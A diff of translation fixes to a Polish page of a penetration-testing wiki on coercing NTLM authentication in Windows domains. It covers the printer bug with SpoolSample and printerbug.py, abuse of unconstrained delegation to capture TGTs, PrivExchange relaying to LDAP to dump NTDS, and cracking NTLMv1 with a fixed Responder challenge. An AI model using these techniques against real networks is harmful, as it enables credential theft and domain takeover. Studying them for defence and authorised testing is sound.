@@ -28,7 +28,7 @@ Możesz również użyć rpcdump.py na Linuxie i szukać protokołu MS-RPRN.
 ```bash
 rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```
-### Poproś usługę o uwierzytelnienie przeciwko dowolnemu hoście
+### Poproś usługę o uwierzytelnienie się w stosunku do dowolnego hosta
 
 Możesz skompilować[ **SpoolSample stąd**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
 ```bash
@@ -41,7 +41,7 @@ printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
 ### Łączenie z Nieograniczoną Delegacją
 
-Jeśli atakujący już skompromitował komputer z [Nieograniczoną Delegacją](unconstrained-delegation.md), atakujący może **sprawić, że drukarka uwierzytelni się w tym komputerze**. Z powodu nieograniczonej delegacji, **TGT** konta **komputera drukarki** będzie **zapisywane w** **pamięci** komputera z nieograniczoną delegacją. Ponieważ atakujący już skompromitował ten host, będzie w stanie **odzyskać ten bilet** i go nadużyć ([Pass the Ticket](pass-the-ticket.md)).
+Jeśli atakujący już skompromitował komputer z [Nieograniczoną Delegacją](unconstrained-delegation.md), atakujący może **sprawić, że drukarka uwierzytelni się w tym komputerze**. Z powodu nieograniczonej delegacji, **TGT** **konta komputera drukarki** będzie **zapisane w** **pamięci** komputera z nieograniczoną delegacją. Ponieważ atakujący już skompromitował ten host, będzie w stanie **odzyskać ten bilet** i go nadużyć ([Pass the Ticket](pass-the-ticket.md)).
 
 ## Wymuszenie uwierzytelnienia RCP
 
@@ -51,9 +51,9 @@ https://github.com/p0dalirius/Coercer
 
 ## PrivExchange
 
-Atak `PrivExchange` jest wynikiem luki znalezionej w **funkcji `PushSubscription` serwera Exchange**. Funkcja ta pozwala serwerowi Exchange na wymuszenie przez dowolnego użytkownika domeny z skrzynką pocztową uwierzytelnienia do dowolnego hosta dostarczonego przez klienta za pośrednictwem HTTP.
+Atak `PrivExchange` jest wynikiem luki znalezionej w **funkcji `PushSubscription` serwera Exchange**. Ta funkcja pozwala serwerowi Exchange na wymuszenie przez dowolnego użytkownika domeny z skrzynką pocztową uwierzytelnienia do dowolnego hosta dostarczonego przez klienta za pośrednictwem HTTP.
 
-Domyślnie **usługa Exchange działa jako SYSTEM** i ma nadmierne uprawnienia (konkretnie, ma **uprawnienia WriteDacl na domenie przed aktualizacją zbiorczą z 2019 roku**). Ta luka może być wykorzystana do umożliwienia **przekazywania informacji do LDAP i następnie wydobycia bazy danych NTDS domeny**. W przypadkach, gdy przekazywanie do LDAP nie jest możliwe, ta luka może być nadal używana do przekazywania i uwierzytelniania do innych hostów w obrębie domeny. Udane wykorzystanie tego ataku zapewnia natychmiastowy dostęp do administratora domeny z dowolnym uwierzytelnionym kontem użytkownika domeny.
+Domyślnie **usługa Exchange działa jako SYSTEM** i ma nadmierne uprawnienia (konkretnie, ma **uprawnienia WriteDacl na domenie przed 2019 rokiem Cumulative Update**). Ta luka może być wykorzystana do umożliwienia **przekazywania informacji do LDAP i następnie wydobycia bazy danych NTDS domeny**. W przypadkach, gdy przekazywanie do LDAP nie jest możliwe, ta luka może być nadal używana do przekazywania i uwierzytelniania do innych hostów w obrębie domeny. Udane wykorzystanie tego ataku zapewnia natychmiastowy dostęp do administratora domeny z dowolnym uwierzytelnionym kontem użytkownika domeny.
 
 ## Wewnątrz Windows
 
@@ -104,7 +104,7 @@ Jeśli możesz przeprowadzić atak MitM na komputer i wstrzyknąć HTML na stron
 ```
 ## Łamanie NTLMv1
 
-Jeśli możesz przechwycić [wyzwania NTLMv1, przeczytaj tutaj, jak je złamać](../ntlm/index.html#ntlmv1-attack).\
-_&#x52;emember, że aby złamać NTLMv1, musisz ustawić wyzwanie Respondera na "1122334455667788"_
+Jeśli możesz przechwycić [wyzwania NTLMv1 przeczytaj tutaj jak je złamać](../ntlm/index.html#ntlmv1-attack).\
+_Pamiętaj, że aby złamać NTLMv1 musisz ustawić wyzwanie Respondera na "1122334455667788"_
 
 {{#include ../../banners/hacktricks-training.md}}
